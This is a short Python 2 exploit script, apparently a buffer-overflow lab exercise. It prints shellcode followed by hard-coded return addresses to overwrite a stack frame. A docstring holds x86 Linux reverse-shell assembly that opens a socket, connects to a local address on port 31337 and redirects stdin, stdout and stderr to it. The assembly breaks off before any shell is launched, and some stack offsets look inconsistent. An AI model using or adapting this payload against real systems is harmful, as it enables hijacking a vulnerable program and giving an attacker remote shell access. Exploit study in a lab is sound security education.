from struct import pack
from shellcode import shellcode

#ebp = 0xbffe9598

preShellcode = ""

print preShellcode + shellcode + '\x12'*0 + pack("<I", 0xbffe8d88) + pack("<I", 0xbffe959c)

"""
xorl %ebx, %ebx
xorl %ecx, %ecx	#clear registers
xorl %edx, %edx
xorl %eax, %eax

pushl        %ebp
movl         %esp, %ebp	#make room for local vars
subl         $36, %esp        

        # parameters for socket(2) 
#movw         $2, -12(%ebp) # PF_INET
push		$2
pop		-12(%ebp)
#movw         $1, -8(%ebp)  # SOCK_STREAM
push		$1
pop		-8(%ebp)
#movw         $0, -4(%ebp) 
push		%edx
pop		-4(%ebp)

        # invoke socketcall
#movw         $102, %ax          #socketcall
push		$102
pop		%eax
#movw         $1, %bx            #socket
push		$1
pop		%ebx

leal         -12(%ebp), %ecx     #address of parameter array
int          $0x80
movl         %eax, -16(%ebp)	

#movw	$2, -36(%ebp)
push	$2
pop	-36(%ebp)
movw	$0x697a, -34(%ebp)	#port 31337
#movl	$0x0100007f, -32(%ebp)	#ip 127.0.0.1
push	0x0101017f
pop	-32(%ebp)
 
#movw	$102, %ax
push	$102
pop	%eax
#movw	$3, %bx		#parameters for socketcall connect
push	$3
pop	%ebx
leal	-24(%ebp), %ecx
int	$0x80			#invoke connect


#redirecting std
xorl %ebx, %ebx
xorl %ecx, %ecx	#clear registers again
xorl %edx, %edx
xorl %eax, %eax

movb $63, %al
movl -24(%ebp), %ebx	#parameters for dup2 (stdin)
int $0x80

movb $63, %al
movb $1, %cl		#parameters for dup2 (stdout)
int $0x80

movb $63, %al
movb $2, %cl		#parameters for dup2 (stderr)
int $0x80
"""
